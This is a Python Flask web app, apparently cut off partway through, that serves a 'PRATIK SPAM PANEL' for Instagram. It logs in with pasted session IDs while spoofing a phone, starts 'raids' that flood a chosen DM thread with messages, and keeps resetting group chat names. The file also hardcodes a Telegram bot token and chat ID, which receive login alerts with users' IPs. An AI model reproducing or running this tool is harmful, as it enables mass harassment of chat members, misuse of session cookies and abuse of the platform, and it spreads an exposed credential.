import os
import time
import uuid
import sqlite3
import random
import threading
import json
import re
import secrets
import requests
from datetime import datetime
from flask import Flask, render_template_string, request, session, redirect, url_for
from flask_socketio import SocketIO, emit, join_room
from werkzeug.security import generate_password_hash, check_password_hash
import instagrapi
from instagrapi import Client
from instagrapi.exceptions import LoginRequired

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key_pratik_secure_2026'
socketio = SocketIO(app, cors_allowed_origins="*")

DB_FILE = 'raid_console_data.db'
DELAYS = [24, 45, 20, 15, 40]

# =========================================================
# TELEGRAM CONFIG — replace with your own values
# =========================================================
ADMIN_TG_BOT_TOKEN = "8638359983:AAF6idGhhUvS10_JthO3ZI6wM2pfB1j8beM"
ADMIN_TG_CHAT_ID   = "6580991809"

def send_telegram_alert(message):
    try:
        if ADMIN_TG_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
            return
        url = f"https://api.telegram.org/bot{ADMIN_TG_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram alert error: {e}")

def get_client_ip():
    return request.headers.get('X-Forwarded-For', request.remote_addr) or "Unknown"

def get_client_ua():
    return request.headers.get('User-Agent', 'Unknown Device')

# --- DATABASE ---
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password_hash TEXT,
            created_at TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_raids (
            user_key TEXT PRIMARY KEY,
            owner TEXT DEFAULT NULL,
            secure_key TEXT DEFAULT NULL,
            session_id TEXT,
            thread_id TEXT,
            message TEXT,
            is_active INTEGER DEFAULT 0,
            sent_count INTEGER DEFAULT 0,
            failed_count INTEGER DEFAULT 0,
            username TEXT DEFAULT 'NOT LOGGED IN',
            gc_nc_thread_id TEXT DEFAULT NULL,
            gc_nc_name TEXT DEFAULT NULL,
            gc_nc_delay INTEGER DEFAULT 10,
            gc_nc_active INTEGER DEFAULT 0,
            nc_count INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS console_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_key TEXT,
            owner TEXT DEFAULT NULL,
            log_message TEXT,
            log_type TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_db_connection():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def save_log(user_key, owner, message, log_type):
    timestamp = time.strftime('%H:%M:%S')
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO console_logs (user_key, owner, log_message, log_type, timestamp) VALUES (?, ?, ?, ?, ?)',
        (user_key, owner, message, log_type, timestamp)
    )
    conn.commit()
    conn.close()

active_clients = {}
gc_nc_threads = {}

DEVICE_SETTINGS = {
    "app_version": "330.0.0.34.90",
    "android_version": 31,
    "android_release": "12.0",
    "dpi": "480dpi",
    "resolution": "1080x2340",
    "manufacturer": "Samsung",
    "device": "beyond2q",
    "model": "SM-G975F",
    "cpu": "exynos9820"
}

HEADERS = {
    "User-Agent": "Instagram 330.0.0.34.90 Android (31/12; 480dpi; 1080x2340; Samsung; SM-G975F; beyond2q; exynos9820; en_US)",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
}

def get_instagram_client(user_key, session_id):
    try:
        cl = Client()
        cl.set_device(DEVICE_SETTINGS)
        cl.set_user_agent(HEADERS["User-Agent"])
        cl.login_by_sessionid(session_id)
        user_info = cl.account_info()
        if user_info and user_info.pk:
            session_file = f"session_{user_key}.json"
            cl.dump_settings(session_file)
            return cl, user_info
        return None, None
    except Exception as e:
        print(f"Login error: {e}")
        return None, None

def verify_session(session_id):
    try:
        cl = Client()
        cl.set_device(DEVICE_SETTINGS)
        cl.set_user_agent(HEADERS["User-Agent"])
        cl.login_by_sessionid(session_id)
        user_info = cl.account_info()
        if user_info and user_info.pk:
            return True, user_info.username
        return False, None
    except Exception as e:
        print(f"Session verification failed: {e}")
        return False, None

def resolve_thread_id(cl, raw_input):
    raw_input = raw_input.strip()
    match = re.search(r'(\d{15,})', raw_input)
    if match:
        return match.group(1)
    return raw_input

def run_gc_nc_worker(page_key, thread_id, desired_name, delay, page_id, user_key, owner):
    nc_counter = 0
    while gc_nc_threads.get(page_key, False):
        try:
            conn = get_db_connection()
            status_row = conn.execute(
                'SELECT is_active, session_id FROM user_raids WHERE user_key = ?', (page_key,)
            ).fetchone()
            conn.close()

            if not status_row or not status_row['session_id']:
                break

            cl = active_clients.get(page_key)
            if not cl:
                cl, user_info = get_instagram_client(page_key, status_row['session_id'])
                if cl and user_info:
                    active_clients[page_key] = cl
                else:
                    time.sleep(5)
                    continue

            try:
                resolved_id = resolve_thread_id(cl, thread_id)
                threads = cl.direct_threads(amount=20)
                target_thread = None
                for t in threads:
                    t_id = str(getattr(t, 'id', None) or getattr(t, 'pk', None))
                    if t_id == str(resolved_id):
                        target_thread = t
                        break

                if target_thread:
                    current_title = getattr(target_thread, 'title', '')
                    if current_title != desired_name:
                        cl.direct_thread_update_title(resolved_id, desired_name)
                        nc_counter += 1
                        msg = f"Nc #{nc_counter}"
                        save_log(page_key, owner, msg, 'success')
                        socketio.emit('console_message', {
                            'message': msg, 'type': 'success',
                            'timestamp': time.strftime('%H:%M:%S'),
                            'page_id': page_id, 'user_key': user_key, 'owner': owner
                        }, room=page_key)

                        c2 = get_db_connection()
                        c2.execute('UPDATE user_raids SET nc_count = ? WHERE user_key = ?', (nc_counter, page_key))
                        c2.commit()
                        c2.close()

            except Exception as e:
                err = f"Error: {str(e)[:40]}"
                save_log(page_key, owner, err, 'error')
                socketio.emit('console_message', {
                    'message': err, 'type': 'error',
                    'timestamp': time.strftime('%H:%M:%S'),
                    'page_id': page_id, 'user_key': user_key, 'owner': owner
                }, room=page_key)

            for _ in range(int(delay)):
                if not gc_nc_threads.get(page_key, False):
                    break
                time.sleep(1)

        except Exception as e:
            print(f"GC NC worker error: {e}")
            time.sleep(5)

    if page_key in gc_nc_threads:
        del gc_nc_threads[page_key]

    conn = get_db_connection()
    conn.execute('UPDATE user_raids SET gc_nc_active = 0 WHERE user_key = ?', (page_key,))
    conn.commit()
    conn.close()

    socketio.emit('update_stats', {
        'gc_nc_status': 'STOPPED',
        'page_id': page_id, 'user_key': user_key, 'owner': owner
    }, room=page_key)


# =========================================================
# AUTH PAGE (LOGIN ONLY)
# =========================================================
AUTH_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRATIK - LOGIN</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', monospace; }
        body { background-color: #0a0a0a; color: #0f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .auth-box { background: #111; border: 2px solid #00ff00; border-radius: 10px; padding: 35px; width: 380px; box-shadow: 0 0 25px rgba(0, 255, 0, 0.3); }
        .auth-title { color: #00ff00; text-align: center; font-size: 1.4rem; margin-bottom: 25px; text-shadow: 0 0 10px rgba(0, 255, 0, 0.5); border-bottom: 2px solid #00ff00; padding-bottom: 12px; }
        .auth-group { margin-bottom: 15px; }
        .auth-group label { display: block; color: #00ff00; margin-bottom: 6px; font-size: 0.9rem; }
        .auth-group input { width: 100%; padding: 12px; background: #000; border: 1px solid #444; color: #0f0; border-radius: 5px; outline: none; }
        .auth-group input:focus { border-color: #00ff00; }
        .auth-btn { width: 100%; padding: 13px; background: linear-gradient(45deg, #00ff00, #00cc00); color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; margin-top: 8px; }
        .auth-btn:hover { box-shadow: 0 0 15px #00ff00; }
        .auth-error { background: rgba(255, 0, 0, 0.15); border: 1px solid #ff0000; color: #ff8888; padding: 10px; border-radius: 5px; font-size: 0.85rem; text-align: center; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="auth-box">
        <div class="auth-title">PRATIK PANEL ACCESS</div>
        {% if error %}<div class="auth-error">{{ error }}</div>{% endif %}
        <form method="POST" action="/login">
            <div class="auth-group"><label>USERNAME</label><input type="text" name="username" required autocomplete="off"></div>
            <div class="auth-group"><label>PASSWORD</label><input type="password" name="password" required></div>
            <button type="submit" class="auth-btn">LOGIN</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        ip = get_client_ip()
        ua = get_client_ua()

        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT password_hash FROM users WHERE username = ?", (username,))
        row = cursor.fetchone()
        conn.close()

        if row and check_password_hash(row[0], password):
            session['operator_name'] = username
            send_telegram_alert(
                f"🔐 *PANEL LOGIN*\n\n👤 `{username}`\n🌐 `{ip}`\n💻 `{ua[:80]}`\n⏰ `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
            )
            return redirect(url_for('index'))

        send_telegram_alert(
            f"⚠️ *LOGIN FAILED*\n\n👤 `{username}`\n🌐 `{ip}`\n💻 `{ua[:80]}`"
        )
        return render_template_string(AUTH_HTML, error='Invalid credentials.')
    return render_template_string(AUTH_HTML)

@app.route('/logout')
def logout_page():
    uname = session.get('operator_name', 'unknown')
    send_telegram_alert(f"🚪 *PANEL LOGOUT*\n\n👤 `{uname}`\n🌐 `{get_client_ip()}`")
    session.pop('operator_name', None)
    return redirect(url_for('login_page'))


# =========================================================
# MAIN PANEL (per-user private secure key)
# =========================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRATIK - SPAM PANEL</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', monospace; }
        body { background-color: #0a0a0a; color: #0f0; min-height: 100vh; padding: 20px; overflow-x: hidden; }

        .header {
            position: relative; text-align: center; margin-bottom: 15px; padding: 20px 70px;
            background: linear-gradient(90deg, #ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
            background-size: 400% 400%; animation: gradient 15s ease infinite; border-radius: 10px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
        }
        @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

        .icon-btn { position: absolute; top: 50%; transform: translateY(-50%); background: rgba(0,0,0,0.6); color: #00ff00; border: 2px solid #00ff00; border-radius: 8px; width: 50px; height: 50px; font-size: 1.8rem; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.3s ease; z-index: 10; }
        .icon-btn:hover { background: #00ff00; color: #000; box-shadow: 0 0 15px #00ff00; }
        .btn-menu { left: 15px; }
        .btn-add { right: 15px; }
        .btn-logout { position: absolute; top: 50%; right: 80px; transform: translateY(-50%); background: rgba(0,0,0,0.6); color: #ff0000; border: 2px solid #ff0000; border-radius: 8px; padding: 10px 15px; font-size: 0.85rem; cursor: pointer; text-decoration: none; font-weight: bold; transition: all 0.3s ease; z-index: 10; }
        .btn-logout:hover { background: #ff0000; color: #fff; box-shadow: 0 0 15px #ff0000; }

        .glowing-text { font-size: 3.5rem; font-weight: 900; color: white; text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; letter-spacing: 2px; }

        .tabs-bar { display: flex; gap: 10px; margin-bottom: 20px; overflow-x: auto; padding-bottom: 5px; }
        .tab-item { background: #111; color: #888; border: 1px solid #333; padding: 8px 16px; border-radius: 5px; cursor: pointer; white-space: nowrap; display: flex; align-items: center; gap: 10px; }
        .tab-item.active { color: #00ff00; border-color: #00ff00; background: #1e1e1e; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
        .tab-item .close-tab { color: #ff0000; font-weight: bold; }

        .drawer { position: fixed; top: 0; left: -320px; width: 300px; height: 100%; background-color: #111; border-right: 2px solid #00ff00; box-shadow: 5px 0 25px rgba(0, 255, 0, 0.3); transition: left 0.3s ease; z-index: 100; padding: 20px; }
        .drawer.open { left: 0; }
        .drawer-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
        .drawer-close { background: none; border: none; color: #ff0000; font-size: 1.5rem; cursor: pointer; }
        .pages-list { list-style: none; max-height: calc(100vh - 120px); overflow-y: auto; }
        .pages-list li { background: #222; margin-bottom: 10px; padding: 12px; border-radius: 5px; border: 1px solid #444; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
        .pages-list li:hover { border-color: #00ff00; }

        .container { display: flex; gap: 20px; max-width: 1800px; margin: 0 auto; flex-wrap: wrap; }
        .left-panel { flex: 1; min-width: 350px; background-color: #111; border-radius: 10px; padding: 25px; border: 2px solid #ff0000; box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); }
        .right-panel { flex: 2; min-width: 400px; background-color: #111; border-radius: 10px; padding: 25px; border: 2px solid #00ff00; box-shadow: 0 0 20px rgba(0, 255, 0, 0.3); min-height: 600px; }
        .panel-title { color: #ff0000; font-size: 1.8rem; margin-bottom: 20px; text-align: center; border-bottom: 2px solid #ff0000; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
        .panel-title.green { color: #00ff00; border-bottom-color: #00ff00; text-shadow: 0 0 10px rgba(0, 255, 0, 0.5); }

        .form-group { background-color: #222; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; color: #00ff00; margin-bottom: 8px; font-weight: bold; }
        .input-group input, .input-group textarea { width: 100%; padding: 12px; background: #000; border: 1px solid #444; color: #0f0; border-radius: 5px; outline: none; }
        .input-group input:focus, .input-group textarea:focus { border-color: #00ff00; }
        textarea { resize: vertical; min-height: 100px; }

        .button-group { display: flex; gap: 15px; margin-top: 15px; }
        .btn { flex: 1; padding: 15px; border: none; border-radius: 5px; font-size: 1.1rem; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        .btn-login { background: linear-gradient(45deg, #ff0000, #ff4400); color: white; }
        .btn-start { background: linear-gradient(45deg, #00ff00, #00cc00); color: black; }
        .btn-stop { background: linear-gradient(45deg, #ff4444, #ff0000); color: white; }

        .stats { background-color: #222; padding: 20px; border-radius: 10px; margin-top: 20px; border: 1px solid #444; }
        .stat-item { display: flex; justify-content: space-between; margin-bottom: 10px; color: #0f0; font-size: 1.1rem; }

        .console-container { background-color: #000; border-radius: 10px; padding: 20px; height: 500px; overflow-y: auto; border: 2px solid #333; }
        .console-line { margin-bottom: 8px; padding-left: 10px; border-left: 3px solid transparent; animation: fadeIn 0.5s; }
        .console-line.success { color: #00ff00; border-left-color: #00ff00; }
        .console-line.error { color: #ff0000; border-left-color: #ff0000; }
        .console-line.info { color: #00ffff; border-left-color: #00ffff; }
        .console-line.warning { color: #ffff00; border-left-color: #ffff00; }
        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }

        .status-indicator { display: inline-block; width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
        .status-online { background-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
        .status-offline { background-color: #ff0000; box-shadow: 0 0 10px #ff0000; }

        @media (max-width: 1200px) { .container { flex-direction: column; } .glowing-text { font-size: 2.5rem; } }
    </style>
</head>
<body>
    <div class="header">
        <button class="icon-btn btn-menu" onclick="toggleDrawer()">☰</button>
        <h1 class="glowing-text">PRATIK SPAM PANEL</h1>
        <a href="/logout" class="btn-logout">LOGOUT</a>
        <button class="icon-btn btn-add" onclick="createNewPage(true)">+</button>
    </div>

    <div class="tabs-bar" id="tabsBar"></div>

    <div class="drawer" id="pagesDrawer">
        <div class="drawer-header">
            <h3>MY PAGES (<span id="totalPagesCount">0</span>)</h3>
            <button class="drawer-close" onclick="toggleDrawer()">✖</button>
        </div>
        <ul class="pages-list" id="pagesList"></ul>
    </div>

    <div class="container">
        <div class="left-panel">
            <h2 class="panel-title">CONTROL PANEL</h2>
            <div class="form-group">
                <div class="input-group">
                    <label for="sessionId">SESSION ID</label>
                    <input type="text" id="sessionId" placeholder="Enter Instagram Session ID">
                </div>
                <div class="button-group">
                    <button class="btn btn-login" onclick="login()">LOGIN</button>
                    <button class="btn btn-stop" onclick="logout()">LOGOUT</button>
                </div>
            </div>

            <div class="form-group">
                <div class="input-group">
                    <label for="threadId">THREAD ID</label>
                    <input type="text" id="threadId" placeholder="Enter Thread ID">
                </div>
                <div class="input-group">
                    <label for="message">MESSAGE</label>
                    <textarea id="message" placeholder="Enter message..."></textarea>
                </div>
                <div class="button-group">
                    <button class="btn btn-start" onclick="startSending()">START RAID</button>
                    <button class="btn btn-stop" onclick="stopSending()">STOP RAID</button>
                </div>
            </div>

            <div class="form-group">
                <h3 style="color:#00ff00; text-align:center; margin-bottom:15px; font-size:1.2rem; border-bottom:1px solid #00ff00; padding-bottom:8px;">GC NC (NAME CHANGER)</h3>
                <div class="input-group">
                    <label for="gcNcThreadId">GC THREAD ID</label>
                    <input type="text" id="gcNcThreadId" placeholder="Enter Group Thread ID">
                </div>
                <div class="input-group">
                    <label for="gcNcName">LOCKED NAME</label>
                    <input type="text" id="gcNcName" placeholder="Enter locked group name">
                </div>
                <div class="input-group">
                    <label for="gcNcDelay">DELAY (Seconds)</label>
                    <input type="number" id="gcNcDelay" value="10" min="3" max="300">
                </div>
                <div class="button-group">
                    <button class="btn btn-start" onclick="startGcNc()">START GC NC</button>
                    <button class="btn btn-stop" onclick="stopGcNc()">STOP GC NC</button>
                </div>
            </div>

            <div class="stats">
                <div id="statusDisplay"><span class="status-indicator status-offline"></span> STATUS: OFFLINE</div>
                <div id="usernameDisplay">USERNAME: NOT LOGGED IN</div>
                <hr style="border-color:#444; margin: 15px 0;">
                <div class="stat-item"><span>MESSAGES SENT:</span><span id="sentCount">0</span></div>
                <div class="stat-item"><span>FAILED:</span><span id="failedCount">0</span></div>
                <div class="stat-item"><span>RAID STATUS:</span><span id="raidStatus">IDLE</span></div>
                <div class="stat-item"><span>GC NC STATUS:</span><span id="gcNcStatus">IDLE</span></div>
                <div class="stat-item"><span>NC COUNT:</span><span id="ncCount">0</span></div>
            </div>
        </div>

        <div class="right-panel">
            <h2 class="panel-title green">LIVE CONSOLE</h2>
            <div class="console-container" id="console"></div>
        </div>
    </div>

    <script>
        let socket = io();
        const OWNER = "{{ owner_name }}";

        const pagesKey  = 'pratik_pages_' + OWNER;
        const activeKey = 'pratik_active_' + OWNER;
        const userKeyStorage = 'pratik_ukey_' + OWNER;

        let storedPages = JSON.parse(localStorage.getItem(pagesKey) || '[]');
        let activePageId = localStorage.getItem(activeKey);

        let userKey = localStorage.getItem(userKeyStorage);
        if (!userKey) {
            userKey = 'u_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem(userKeyStorage, userKey);
        }

        let currentPageId = activePageId || ('Page_' + Date.now());

        if (storedPages.length === 0) {
            createNewPage(false);
        } else {
            if (!activePageId) {
                activePageId = storedPages[0].id;
                localStorage.setItem(activeKey, activePageId);
            }
            currentPageId = activePageId;
            renderTabs();
            renderStoredPagesList();
        }

        socket.on('connect', function() {
            socket.emit('register_page', { page_id: currentPageId, user_key: userKey, owner: OWNER });
        });

        function createNewPage(userClicked = true) {
            const pageId = 'Page_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4);
            const newPage = { id: pageId, name: 'Console #' + (storedPages.length + 1), created: new Date().toLocaleTimeString() };
            storedPages.push(newPage);
            activePageId = pageId; currentPageId = pageId;
            savePages(); renderTabs(); renderStoredPagesList();
            socket.emit('register_page', { page_id: pageId, user_key: userKey, owner: OWNER });
        }

        function switchPage(pageId) {
            activePageId = pageId; currentPageId = pageId;
            localStorage.setItem(activeKey, activePageId);
            renderTabs(); renderStoredPagesList();
            socket.emit('register_page', { page_id: pageId, user_key: userKey, owner: OWNER });
            document.getElementById('console').innerHTML = '';
            socket.emit('request_page_data', { page_id: pageId, user_key: userKey, owner: OWNER });
        }

        function removePage(pageId, event) {
            if (event) event.stopPropagation();
            if (storedPages.length <= 1) return;
            storedPages = storedPages.filter(p => p.id !== pageId);
            if (activePageId === pageId) {
                activePageId = storedPages[0].id;
                currentPageId = activePageId;
                localStorage.setItem(activeKey, activePageId);
            }
            savePages(); renderTabs(); renderStoredPagesList();
            socket.emit('unregister_page', { page_id: pageId, user_key: userKey, owner: OWNER });
        }

        function savePages() {
            localStorage.setItem(pagesKey, JSON.stringify(storedPages));
            localStorage.setItem(activeKey, activePageId);
        }

        function renderTabs() {
            const tabsBar = document.getElementById('tabsBar');
            tabsBar.innerHTML = storedPages.map(page => `
                <div class="tab-item ${page.id === activePageId ? 'active' : ''}" onclick="switchPage('${page.id}')">
                    <span>${page.name}</span>
                    <span class="close-tab" onclick="removePage('${page.id}', event)">✖</span>
                </div>
            `).join('');
        }

        function renderStoredPagesList() {
            const list = document.getElementById('pagesList');
            document.getElementById('totalPagesCount').textContent = storedPages.length;
            list.innerHTML = storedPages.map(page => `
                <li onclick="switchPage('${page.id}')">
                    <div>
                        <strong>${page.name}</strong><br>
                        <small style="color:#777">Created: ${page.created}</small>
                    </div>
                    ${storedPages.length > 1 ? `<span style="color:#ff0000;" onclick="removePage('${page.id}', event)">Delete</span>` : ''}
                </li>
            `).join('');
        }

        function toggleDrawer() {
            document.getElementById('pagesDrawer').classList.toggle('open');
        }

        socket.on('init_state', function(data) {
            if (data.owner && data.owner !== OWNER) return;
            if (data.page_id && data.page_id !== currentPageId) return;
            if (data.user_key && data.user_key !== userKey) return;

            document.getElementById('sessionId').value = data.session_id || '';
            document.getElementById('threadId').value = data.thread_id || '';
            if (data.message) document.getElementById('message').value = data.message;
            if (data.gc_nc_thread_id) document.getElementById('gcNcThreadId').value = data.gc_nc_thread_id;
            if (data.gc_nc_name) document.getElementById('gcNcName').value = data.gc_nc_name;
            if (data.gc_nc_delay) document.getElementById('gcNcDelay').value = data.gc_nc_delay;

            document.getElementById('sentCount').textContent = data.sent_count;
            document.getElementById('failedCount').textContent = data.failed_count;
            document.getElementById('raidStatus').textContent = data.is_active ? 'RUNNING' : 'STOPPED';
            document.getElementById('gcNcStatus').textContent = data.gc_nc_active ? 'RUNNING' : 'STOPPED';
            if (data.nc_count !== undefined) document.getElementById('ncCount').textContent = data.nc_count;

            if (data.username && data.username !== 'NOT LOGGED IN') {
                document.getElementById('statusDisplay').innerHTML = '<span class="status-indicator status-online"></span> STATUS: ONLINE';
                document.getElementById('usernameDisplay').textContent = 'USERNAME: ' + data.username;
            }

            const consoleDiv = document.getElementById('console');
            consoleDiv.innerHTML = '';
            data.logs.forEach(log => {
                addConsoleMessage(`[${log.timestamp}] ${log.log_message}`, log.log_type, false);
            });
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        });

        socket.on('console_message', function(data) {
            if (data.owner && data.owner !== OWNER) return;
            if (data.page_id && data.page_id !== currentPageId) return;
            if (data.user_key && data.user_key !== userKey) return;
            addConsoleMessage(`[${data.timestamp}] ${data.message}`, data.type, true);
        });

        socket.on('update_stats', function(data) {
            if (data.owner && data.owner !== OWNER) return;
            if (data.page_id && data.page_id !== currentPageId) return;
            if (data.user_key && data.user_key !== userKey) return;
            if (data.sent !== undefined) document.getElementById('sentCount').textContent = data.sent;
            if (data.failed !== undefined) document.getElementById('failedCount').textContent = data.failed;
            if (data.raid_status) document.getElementById('raidStatus').textContent = data.raid_status;
            if (data.gc_nc_status) document.getElementById('gcNcStatus').textContent = data.gc_nc_status;
            if (data.nc_count !== undefined) document.getElementById('ncCount').textContent = data.nc_count;
        });

        socket.on('login_status', function(data) {
            if (data.owner && data.owner !== OWNER) return;
            if (data.page_id && data.page_id !== currentPageId) return;
            if (data.user_key && data.user_key !== userKey) return;
            if (data.success) {
                document.getElementById('statusDisplay').innerHTML = '<span class="status-indicator status-online"></span> STATUS: ONLINE';
                document.getElementById('usernameDisplay').textContent = 'USERNAME: ' + data.username;
            }
        });

        function addConsoleMessage(message, type = 'info', scroll = true) {
            const consoleDiv = document.getElementById('console');
            const messageDiv = document.createElement('div');
            messageDiv.className = `console-line ${type}`;
            messageDiv.textContent = message;
            consoleDiv.appendChild(messageDiv);
            if (scroll) consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        function login() {
            const sid = document.getElementById('sessionId').value.trim();
            if (sid) socket.emit('login', { session_id: sid, page_id: currentPageId, user_key: userKey, owner: OWNER });
        }

        function logout() {
            socket.emit('logout', { page_id: currentPageId, user_key: userKey, owner: OWNER });
            document.getElementById('statusDisplay').innerHTML = '<span class="status-indicator status-offline"></span> STATUS: OFFLINE';
            document.getElementById('usernameDisplay').textContent = 'USERNAME: NOT LOGGED IN';
        }

        function startSending() {
            const threadId = document.getElementById('threadId').value.trim();
            const message = document.getElementById('message').value.trim();
            if (threadId && message) {
                socket.emit('start_raid', { thread_id: threadId, message: message, page_id: currentPageId, user_key: userKey, owner: OWNER });
            }
        }

        function stopSending() {
            socket.emit('stop_raid', { page_id: currentPageId, user_key: userKey, owner: OWNER });
        }

        function startGcNc() {
            const threadId = document.getElementById('gcNcThreadId').value.trim();
            const name = document.getElementById('gcNcName').value.trim();
            const delay = parseInt(document.getElementById('gcNcDelay').value) || 10;
            if (threadId && name) {
                socket.emit('start_gc_nc', { thread_id: threadId, name: name, delay: delay, page_id: currentPageId, user_key: userKey, owner: OWNER });
            }
        }

        function stopGcNc() {
            socket.emit('stop_gc_nc', { page_id: currentPageId, user_key: userKey, owner: OWNER });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    if 'operator_name' not in session:
        return redirect(url_for('login_page'))
    owner_name = session['operator_name']
    return render_template_string(HTML_TEMPLATE, owner_name=owner_name)

page_data = {}

@socketio.on('connect')
def handle_connect():
    print("Client connected")

def _owner_ok(data, page_key):
    owner = data.get('owner', 'unknown')
    user_key = data.get('user_key')
    page_id = data.get('page_id')
    if not user_key or not page_id:
        return None
    return f"{owner}|{user_key}_{page_id}", owner

@socketio.on('register_page')
def handle_register_page(data):
    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, owner = resolved
    page_id = data.get('page_id')
    user_key = data.get('user_key')

    if page_key not in page_data:
        page_data[page_key] = {
            'owner': owner, 'user_key': user_key, 'page_id': page_id,
            'session_id': '', 'thread_id': '', 'message': '',
            'is_active': False, 'sent_count': 0, 'failed_count': 0,
            'username': 'NOT LOGGED IN',
            'gc_nc_thread_id': '', 'gc_nc_name': '', 'gc_nc_delay': 10, 'gc_nc_active': False,
            'nc_count': 0
        }

    join_room(page_key)

    conn = get_db_connection()
    user_data = conn.execute('SELECT * FROM user_raids WHERE user_key = ? AND owner = ?', (page_key, owner)).fetchone()
    logs = conn.execute('SELECT log_message, log_type, timestamp FROM console_logs WHERE user_key = ? AND owner = ? ORDER BY id ASC', (page_key, owner)).fetchall()
    conn.close()

    if user_data:
        emit('init_state', {
            'owner': owner, 'page_id': page_id, 'user_key': user_key,
            'session_id': user_data['session_id'] or '',
            'thread_id': user_data['thread_id'] or '',
            'message': user_data['message'] or '',
            'is_active': bool(user_data['is_active']),
            'sent_count': user_data['sent_count'] or 0,
            'failed_count': user_data['failed_count'] or 0,
            'username': user_data['username'] or 'NOT LOGGED IN',
            'gc_nc_thread_id': user_data['gc_nc_thread_id'] or '',
            'gc_nc_name': user_data['gc_nc_name'] or '',
            'gc_nc_delay': user_data['gc_nc_delay'] or 10,
            'gc_nc_active': bool(user_data['gc_nc_active']),
            'nc_count': user_data['nc_count'] or 0,
            'logs': [dict(log) for log in logs]
        }, room=page_key)
    else:
        emit('init_state', {
            'owner': owner, 'page_id': page_id, 'user_key': user_key,
            'session_id': '', 'thread_id': '', 'message': '',
            'is_active': False, 'sent_count': 0, 'failed_count': 0,
            'username': 'NOT LOGGED IN',
            'gc_nc_thread_id': '', 'gc_nc_name': '', 'gc_nc_delay': 10, 'gc_nc_active': False,
            'nc_count': 0,
            'logs': []
        }, room=page_key)

@socketio.on('request_page_data')
def handle_request_page_data(data):
    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, owner = resolved
    page_id = data.get('page_id')
    user_key = data.get('user_key')

    conn = get_db_connection()
    user_data = conn.execute('SELECT * FROM user_raids WHERE user_key = ? AND owner = ?', (page_key, owner)).fetchone()
    logs = conn.execute('SELECT log_message, log_type, timestamp FROM console_logs WHERE user_key = ? AND owner = ? ORDER BY id ASC', (page_key, owner)).fetchall()
    conn.close()

    if user_data:
        emit('init_state', {
            'owner': owner, 'page_id': page_id, 'user_key': user_key,
            'session_id': user_data['session_id'] or '',
            'thread_id': user_data['thread_id'] or '',
            'message': user_data['message'] or '',
            'is_active': bool(user_data['is_active']),
            'sent_count': user_data['sent_count'] or 0,
            'failed_count': user_data['failed_count'] or 0,
            'username': user_data['username'] or 'NOT LOGGED IN',
            'gc_nc_thread_id': user_data['gc_nc_thread_id'] or '',
            'gc_nc_name': user_data['gc_nc_name'] or '',
            'gc_nc_delay': user_data['gc_nc_delay'] or 10,
            'gc_nc_active': bool(user_data['gc_nc_active']),
            'nc_count': user_data['nc_count'] or 0,
            'logs': [dict(log) for log in logs]
        }, room=page_key)

@socketio.on('unregister_page')
def handle_unregister_page(data):
